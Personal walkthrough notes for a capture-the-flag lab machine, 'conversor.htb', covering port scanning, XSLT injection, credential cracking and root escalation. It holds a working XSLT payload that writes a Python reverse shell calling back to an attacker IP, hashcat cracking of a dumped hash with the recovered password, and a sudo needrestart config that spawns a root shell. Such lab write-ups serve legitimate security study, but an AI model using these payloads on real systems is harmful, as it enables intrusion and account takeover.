---
tags:
banner:
publish: "false"
---
```
nmap -p- -sV -sC 10.129.15.10
```
- port 22: ssh 8.9p1 ubuntu 3ubuntu0.13
- port 80: apache 2.4.52

# Website on port 80
>[!important]
> Always explore websites through a proxy to map out your exploration


hitting a login page, has a register button. creating a user works to just login.

uploading an xml and template results in a html page being generated client side.

possible [xml injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection)?
xml input is not sanitized !
Cross side scripting is possible.

`Gobuster` detected `/javascript`, but i do not have the permissions

`ffuf` detected no subdomains


## Source code
about page has a source code download.

source code has references to a database and an app secret

sqllite database with users inside the instance folder. Passwords are stored in plaintext.

Sql injection possible?

Local file injection possible when uploading file?

## db file read
[sqlitebrowser](https://www.kali.org/tools/sqlitebrowser/)?

default users.db is empty.

## sqlite code injection
comments for sqlite are `--` or `/* */`
entering `1 or 1=1 --` did not work for password

[sqlmap](https://www.kali.org/tools/sqlmap/) for automated testing of sql injection

copy login request body from burpsuite to a file and feed that file to sqlmap
```bash
sqlmap -r request.txt --risk 5
```

# Xslt injection
xml template gets interpreted as pure html and javascript trough the xslt input file. An [xslt](https://www.w3schools.com/xml/xsl_intro.asp) file is an xml transformer that turns it into another xml or something else.

[https://ine.com/blog/xslt-injections-for-dummies](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20IO%20Active.pdf) page 21, doesnt work on apache servers.

php functions do not run.

Writing a file can be done inside the xslt file, using:
```xml
<xsl:template match="/">
  <xsl:result-document href="pythonfile.py">
    pythoncode
  </xsl:result-document>
</xsl:template>

```

>[!important]
>Every 60 seconds, all python files inside `/scripts/*` are executed

xslt files have extension capabilities, one of which being [document](https://exslt.github.io/exsl/elements/document/index.html).
Document allows you to write files to a location.
```xml
<xsl:stylesheet version="1.0"
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:regexp="http://exslt.org/regular-expressions">
  <xsl:template match="/">
  <xsl:document href="/var/www/conversor.htb/scripts/script100.py" method="text">
export RHOST="10.10.15.140";export RPORT=5555;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
  </xsl:document>
  </xsl:template>
</xsl:stylesheet>
```



# Box connection
logged in as `www-data`.


inside `~/conversor.htb/instance`, read the `users.db`.

```
sqlite3
.open "users.db"
select * from users
```

output is a hash.

write hash to a file locally, `hash.txt`


```
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

> Keepmesafeandwarm

bruuhhh this dumbass reused passwords

login to ssh user `fismathack`, password…you know…

## User access
Logged in as `fismathack`

`sudo -l` tells me that `needrestart` can be ran as root, aka, sudo

[needrestart](https://manpages.ubuntu.com/manpages/focal/man1/needrestart.1.html) is a program that checks which daemons need to be restarted after library upgrades. It has a config mode that runs a specific config file in perl syntax.

create a `.conf` file with the contents `exec '/bin/sh`.

```bash
sudo needrestart -c file.conf
```

`cd /root` and yippie

